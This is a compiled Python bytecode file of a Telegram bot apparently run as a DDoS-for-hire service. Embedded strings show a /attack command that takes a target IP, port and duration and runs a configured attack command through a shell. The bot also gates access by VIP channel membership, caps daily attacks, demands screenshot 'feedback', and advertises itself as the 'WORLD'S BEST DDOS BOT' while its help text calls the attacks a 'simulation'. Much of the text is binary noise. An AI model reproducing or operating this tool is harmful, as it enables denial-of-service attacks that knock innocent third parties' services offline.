�
    �=�g|F  �                   �H  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlm	Z	 d dl
Z
d dlmZ d dl mZ d dlmZmZmZmZmZ  e j(                  e�      ZeZeZeZdadZdZdZi ZdZi ZdZd	d
gZd� Zd� Z d� Z!d� Zda"ejG                  dg��      d� �       Z$d� Z%ejG                  dg��      d� �       Z&ejG                  dg��      d� �       Z'ejG                  dg��      d� �       Z(ejG                  dg��      d� �       Z)ejG                  dg��      d� �       Z*i Z+ejG                  dg��      d � �       Z,ejG                  d!g��      d"� �       Z-ejG                  d#g��      d$� �       Z.d%� Z/ ej`                  e/d&�'�      Z1e1je                  �         e �        d(� Z3e4d)k(  r e3�        yy)*�    N)�Image)�BytesIO)�types)�	BOT_TOKEN�	ADMIN_IDS�GROUP_ID�CHANNEL_USERNAME�ATTACK_COMMAND�
   �   z	users.txtzhttps://envs.sh/g7a.jpgzhttps://envs.sh/Vwc.jpgc                 �b   � 	 t         j                  t        | �      }|j                  dv S #  Y yxY w�N��member�administrator�creatorF��bot�get_chat_memberr	   �status��user_idr   s     �Alone.py�is_user_in_channelr   -   �4   � ���$�$�%5�w�?���}�}� F�F�F�����   �'* �.c                  ��  � 	 t        t        d�      5 } | D ]j  }|j                  �       s�	 |j                  �       j                  d�      \  }}}t	        |�      t
        j
                  j                  |�      d d�t        |<   �l 	 d d d �       y # t        $ r t        d|j                  �       � ��       Y ��w xY w# 1 sw Y   y xY w# t        $ r t        t        � d��       Y y w xY w)N�r�,��attacks�
last_reset�last_attackzSkipping malformed line: z0 not found, initializing an empty user database.)�open�	USER_FILE�strip�split�int�datetime�fromisoformat�	user_data�
ValueError�print�FileNotFoundError)�file�liner   r!   r"   s        r   �
load_usersr1   5   s�   � �N��)�S�!� 	F�T�� F���z�z�|��F�37�:�:�<�3E�3E�c�3J�0�G�W�j�#&�w�<�&.�&7�&7�&E�&E�j�&Q�'+�*�I�g�&�F�	F� 	F�� "� F��5�d�j�j�l�^�D�E�F��	F� 	F�� � N����K�L�M�N�sR   �C �B7�AB� B7�C �%B4�1B7�3B4�4B7�7C �<C � C �C!� C!c            
      ��   � t        t        d�      5 } t        j                  �       D ]3  \  }}| j	                  |� d|d   � d|d   j                  �       � d��       �5 	 d d d �       y # 1 sw Y   y xY w)N�wr   r!   r"   �
)r$   r%   r+   �items�write�	isoformat)r/   r   �datas      r   �
save_usersr9   I   sw   � �	�i��	� Z��&�_�_�.� 	Z�M�G�T��J�J�'��!�D��O�#4�A�d�<�6H�6R�6R�6T�5U�UW�X�Y�	Z�Z� Z� Z�s   �AA&�&A/c                 �b   � 	 t         j                  t        | �      }|j                  dv S #  Y yxY wr   r   r   s     r   r   r   O   r   r   F�attack)�commandsc                 �l  � t        | j                  j                  �      }| j                  j                  }| j                  j                  �       }| j                  j                  t        t        �      k7  rt        j                  | dt        � ��       y t        |�      st        j                  | dt        � ��       y t        j                  |d�      rt        j                  | d�       y t        rt        j                  | d�       y da|t         vr)dt"        j"                  j%                  �       d d�t         |<   t         |   }|d	   t&        k\  rt        j                  | d
�       day t)        |�      dk7  rt        j                  | d�       day |d   |d   |d   }}}	 t        |�      }t        |�      }|dkD  rt        j                  | d�       day t        j-                  |�      }|j.                  dkD  r|j0                  d   d   j2                  }	nt        j                  | d�       day t&        |d	   z
  dz
  }
t5        j6                  t8        �      }t        j;                  | j                  j                  |	d|� d|� d|� d|� d|
� d���       dt        |<   |d	xx   dz  cc<   t=        �        t?        j@                  |||��      }	 tC        jD                  |dd��       t        jI                  | j                  j                  d|� d|� d |� d|
� d!�	�       datK        jL                  tN        | |||||
f�"�      jQ                  �        y # t*        $ r t        j                  | d�       daY y w xY w# tB        jF                  $ r.}t        j                  | d|� ��       dt        |<   daY d }~y d }~ww xY w)#Nu�   🚫 **VIP Access Denied!**
👑 *This service is available exclusively for VIP group members.*
🔗 Join now and enjoy the VIP perks: uf   ⚠️ **Oops, looks like you haven't joined the VIP Channel!**
🔓 Join now to access VIP features: Fuf   😡 **Feedback Pending!**
🚨 *Please submit the required screenshot before launching a new attack.*u�   ⚠️ **Hold on, an attack is already in progress!**
💥 *Please wait until the current attack finishes before starting a new one.*Tr   r    r!   u~   ❌ **Attack Limit Reached!**
⏳ *You have exhausted your daily attack limit.*
🔄 Try again tomorrow to unleash more power!�   ux   ⚠️ **Invalid Command Format!**
📜 *Usage:* /attack `<IP>` `<PORT>` `<TIME>`
Example: `/attack 192.168.1.1 8080 60`�   �   �   uc   ❌ **Invalid Input!**
🔢 *Port and Time must be integers.*
Please try again with correct values.�   u{   🚫 **Maximum Duration Exceeded!**
⏳ *The maximum attack duration is 180 seconds.*
Please adjust the time and try again.�����u�   ❌ **Profile Picture Missing!**
📸 *Please set a profile picture to proceed with your VIP attack.*
Your profile picture is essential for the attack setup.u   👑 **VIP User:** @u.   
🚀 **Attack Initiated!**
🎯 **Target:** `�:u   `
⏳ **Duration:** u   s
⚡ **Remaining Attacks:** uW   
📸 **Screenshot Required!**
😎 **python owner @GODxAloneBoy**
⏳ **Progress: 0%**)�caption)�target�port�time_duration)�shell�checku\   ❌ **Error Encountered!**
💥 *Something went wrong while launching the attack.*
Details: u#   ✅ **VIP Attack Complete!**
🎯 `u/   ` **Successfully Targeted!**
⏳ **Duration:** u;   
😎 **python owner @GODxAloneBoy**
⏳ **Progress: 100%**)rF   �args))�str�	from_user�id�
first_name�textr'   �chatr(   r   r   �reply_tor	   r   �pending_feedback�get�is_attack_in_progressr+   r)   �now�ATTACK_LIMIT�lenr,   �get_user_profile_photos�total_count�photos�file_id�random�choice�
image_urls�
send_photor9   r
   �format�
subprocess�run�CalledProcessError�send_message�	threading�Thread�send_attack_finished�start)�messager   �	user_name�command�userrF   rG   rH   �profile_photos�profile_pic�remaining_attacks�random_image�full_command�es                 r   �handle_attackrt   Z   s  � � �'�#�#�&�&�'�G��!�!�,�,�I��l�l� � �"�G� �|�|���#�h�-�'����W� !H�HX�GY�[� 	\� 	� �g�&����W� !G�GW�FX�Z� 	[�� ���G�U�+����W� l� 	m�� ����W� p� 	q�� !�� �i��)*�(�:K�:K�:O�:O�:Q�bf�g�	�'���W��D� �I��,�&����W� !O� 	P� !&��� �7�|�q�����W� G� 	H� !&��� #*�!�*�g�a�j�'�!�*�-�D�F���4�y���M�*�� �s�����W� F� 	G� !&��� �0�0��9�N��!�!�A�%�$�+�+�A�.�r�2�:�:�����W� X� 	Y� !&���$�t�I��6��:���=�=��,�L� �N�N�7�<�<�?�?�K�;O�PY�{� [M�MS�H�TU�VZ�U[� \M�MZ�O� \V�Vg�Uh� iO�	:P�N� Q� !%��W�� 	��O�q��O� �L� "�(�(��T�Q^�_�L�����|�4�t�<� ���W�\�\�_�_��$�X�Q�t�f� -*�*7�� 93�3D�2E� F.�/�0� "�����0���F�TX�Zg�iz�7{�|�  C�  C�  E��U � ����W� F� 	G� !&�����l �(�(� ����W� !*�*+��.� 	/� %*���!� %�����s*   �M �
M2 �!M/�.M/�2N3�$N.�.N3c                 �X   � t         j                  | j                  j                  d�       y )NuL   🚀 **𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐄𝐀𝐃𝐘!** ⚡)r   re   rQ   rN   )rj   rk   rF   rG   rH   rp   s         r   rh   rh   �   s   � ����W�\�\�_�_�c�f�    �checkoutcooldownc                 �J  � t         r�t        j                  j                  �       t         z
  j                  t        k  rQt        t        j                  j                  �       t         z
  j                  z
  }t
        j                  | d|� d��       y t
        j                  | d�       y )NzGlobal cooldown: z seconds remaining.z/No global cooldown. You can initiate an attack.)�global_last_attack_timer)   rV   �seconds�COOLDOWN_TIMEr   rR   )rj   �remaining_times     r   �check_cooldownr}   �   sv   � ��H�$5�$5�$9�$9�$;�>U�$U�#^�#^�an�#n�&�(�*;�*;�*?�*?�*A�D[�*[�)d�)d�d�����W� 1�.�1A�AT�U�V����W�O�Prv   �	remainingc                 ��   � t        | j                  j                  �      }|t        vrt        j                  | dt        � d��       y t        t        |   d   z
  }t        j                  | d|� d��       y )Nz	You have z attacks remaining for today.r!   )rL   rM   rN   r+   r   rR   rW   )rj   r   rp   s      r   �check_remaining_attackr�   �   sg   � ��'�#�#�&�&�'�G��i�����W�	�,��7T�U�V�(�9�W�+=�i�+H�H�����W�	�*;�)<�<Y�Z�[rv   �resetc                 �  � t        | j                  j                  �      t        vrt        j                  | d�       y | j                  j                  �       }t        |�      dk7  rt        j                  | d�       y |d   }|t        v r1dt        |   d<   t        �        t        j                  | d|� d��       y t        j                  | d	|� d
��       y )N�!Only admins can use this command.r@   zUsage: /reset <user_id>r?   r   r!   zAttack limit for user z has been reset.zNo data found for user �.)rL   rM   rN   �admin_idr   rR   rP   r'   rX   r+   r9   )rj   rl   r   s      r   �
reset_userr�     s�   � �
�7����� ��0����W�A�B���l�l� � �"�G�
�7�|�q�����W�7�8���a�j�G��)��()�	�'��9�%������W� 6�w�i�?O�P�Q����W� 7��y��B�Crv   �setcooldownc                 �  � t        | j                  j                  �      t        vrt        j                  | d�       y | j                  j                  �       }t        |�      dk7  rt        j                  | d�       y 	 t        |d   �      a
t        j                  | dt        � d��       y # t        $ r t        j                  | d�       Y y w xY w)Nr�   r@   zUsage: /setcooldown <seconds>r?   zCooldown time has been set to z	 seconds.z)Please provide a valid number of seconds.)rL   rM   rN   r�   r   rR   rP   r'   rX   r(   r{   r,   )rj   rl   s     r   �set_cooldownr�     s�   � �
�7����� ��0����W�A�B���l�l� � �"�G�
�7�|�q�����W�=�>��K��G�A�J������W� >�}�o�Y�W�X��� K����W�I�J�K�s   �=,B* �*C�C�	viewusersc                 �R  � t        | j                  j                  �      t        vrt        j                  | d�       y dj                  t        j                  �       D ��cg c]  \  }}d|� d|d   � dt        |d   z
  � ��� c}}�      }t        j                  | d|� ��       y c c}}w )Nr�   r4   z	User ID: z, Attacks Used: r!   z, Remaining: zUser Summary:

)
rL   rM   rN   r�   r   rR   �joinr+   r5   rW   )rj   r   r8   �	user_lists       r   �
view_usersr�   '  s�   � �
�7����� ��0����W�A�B���	�	�09���0A�C�,�w�� '�w�i�/?��Y��?P�P]�^j�mq�r{�m|�^|�]}�~� C� D�I��L�L��-�i�[�9�:��Cs   �"B#
�photo)�content_typesc           
      ��  � t        | j                  j                  �      }| j                  j                  }t        j                  |d�      dz   }|t        |<   	 t        j                  t        |�      j                  }|dvrt        j                  | dt        � d��       y 	 t        j                  |d�      r}dt        |<   t        j                  t        | j                  j                  | j                  �       t        j!                  t        d|� d	|� d
|� d��       t        j                  | d�       y t        j                  | d�       y # t        $ r }t        j                  | d�       Y d }~y d }~ww xY w)Nr   r?   r   ut   ❌ **Access Denied!**
👑 *You must join our VIP Channel to submit feedback.*
🔗 **Join Here:** [Click to Join](�)u�   ❌ **Verification Failed!**
🔧 *Please ensure the bot is an admin in the channel.*
⛔ *Verification could not be completed, please try again.*Fu,   📸 **Feedback Received!**
👤 **User:** `u   `
🆔 **User ID:** `u   `
🔢 **Screenshot No.:** `u$   `
💬 **Feedback from VIP member!**un   ✅ **Feedback Accepted!**
🚀 *Your screenshot has been successfully submitted. Ready for your next attack!*uv   ❌ **Invalid Response!**
⚠️ *It seems you submitted this screenshot too early. Please wait for the correct time.*)rL   rM   rN   rO   �feedback_count_dictrT   r   r   r	   r   rR   �	ExceptionrS   �forward_messagerQ   �
message_idre   )rj   r   rk   �feedback_count�user_statusrs   s         r   �handle_screenshotr�   5  s{  � ��'�#�#�&�&�'�G��!�!�,�,�I�(�,�,�W�a�8�1�<�N� $2��� ���)�)�*:�G�D�K�K���D�D��L�L�� %I�IY�HZ�Z[�#]� ^� �	 E� ���G�U�+�$)���!� 	���,�g�l�l�o�o�w�?Q�?Q�R� 	���)�,�,5�;� 7/�/6�i� 86�6D�5E� F>�?�	@� 	���W� t� 	u� 	���W� }� 	~��3 � ����W� ]� 	_� 	��	�s   �AE �	E4�E/�/E4�helpc                 �8   � d}t         j                  | |d��       y )Nu�  
    🌟 **Welcome to the Help Section!** 🌟

    Here are the available commands:

    1. **/start**  
       - Start the bot and get a welcome message.
    
    2. **/attack <IP> <PORT> <TIME>**  
       - Initiates a DDOS attack simulation.

    3. **/checkoutcooldown**  
       - Check the global cooldown time before initiating the next attack.

    4. **/remaining**  
       - Check how many attacks are left for today.

    5. **/reset <user_id>**  
       - Reset the attack count for a user (Admin Only).

    6. **/setcooldown <seconds>**  
       - Set the global cooldown time (Admin Only).

    7. **/viewusers**  
       - View all users and their attack statistics (Admin Only).

    8. **/feedback**  
       - Submit a screenshot of the feedback after completing the attack.

    🚨 **Note:** Only users who have joined the VIP group/channel can use the attack features.

    🚀 **To unlock VIP features, join our group:**  
    [Join Now](https://t.me/+03wLVBPurPk2NWRl)
    �Markdown��
parse_mode)r   rR   )rj   �	help_texts     r   �	show_helpr�   b  s   � �!�I�D �L�L��)�
�L�;rv   ri   c                 �l   � | j                   j                  }d|� d�}t        j                  | |d��       y )Nu&   🌟🔥 **WELCOME TO THE POWER ZONE, u�  !** 🔥🌟

🚀 **You’ve entered the realm of elite power!**  
💥 Welcome to the **WORLD'S BEST DDOS BOT** — exclusive and powerful.  
⚡ **Become the KING, DOMINATE THE WEB!**

🔗 **To access this powerful tool, join us now:**
🍀 **  /help use this feature to help for commands**
👉 [Join Our Exclusive Telegram Group](https://t.me/+03wLVBPurPk2NWRl) 🚀🔥

**Note:** *Only VIP members can unlock the full potential of the bot. Your journey to domination starts here! 💪*
r�   r�   )rM   rO   r   rR   )rj   rk   �responses      r   �welcome_startr�   �  s;   � ��!�!�,�,�I�9�)�� E� �H� �L�L��(�z�L�:rv   c                  �t  � 	 t         j                   j                  �       } d| j                  z
  dz
  dz  d| j                  z
  dz
  dz  z   d| j                  z
  z   }t        j                  |�       t        D ]6  }dt        |   d<   t         j                   j                  �       t        |   d<   �8 t        �        ��)N�   r?   i  �<   r   r!   r"   )	r)   rV   �hour�minute�second�time�sleepr+   r9   )rV   �seconds_until_midnightr   s      r   �
auto_resetr�   �  s�   � �
����#�#�%��#%����=�1�#4��"<�"�s�z�z�/�TU�BU�Y[�A[�!\�`b�eh�eo�eo�`o�!p���
�
�)�*� � 	G�G�,-�I�g��y�)�/7�/@�/@�/D�/D�/F�I�g��|�,�	G� 	�� rv   T)rF   �daemonc                  �0   � t         j                  d��       y )NT)�	none_stop)r   �polling� rv   r   �run_botr�   �  s   � ��K�K�$�K�rv   �__main__)5�telebotr)   r�   rb   r]   �aiohttprf   �pytesseract�PILr   �requests�ior   r   �configr   r   r   r	   r
   �TeleBotr   r�   r{   rW   �global_pending_attackry   rS   r%   r+   r_   r   r1   r9   rU   �message_handlerrt   rh   r}   r�   r�   r�   r�   r�   r�   r�   r�   r�   rg   �reset_threadri   r�   �__name__r�   rv   r   �<module>r�      s\  �� � � � � � � � � � � � � S� S� �g�o�o�i� �� �� ��#� � ����� �� �� � �	� �	�� � ���
�
�N�(Z�� � ����x�j��)�IE� *�IE�Vf� ���1�2��3�Q� 4�Q� ���{�m��,�\� -�\� ���w�i��(�D� )�D�$ ���}�o��.�K� /�K�" ���{�m��,�;� -�;� � ����G�9��-�*~� .�*~�X ���v�h��'�#<� (�#<�J ���w�i��(�;� )�;�"�  �y���z�$�?�� � � � � �� � �z���I� rv   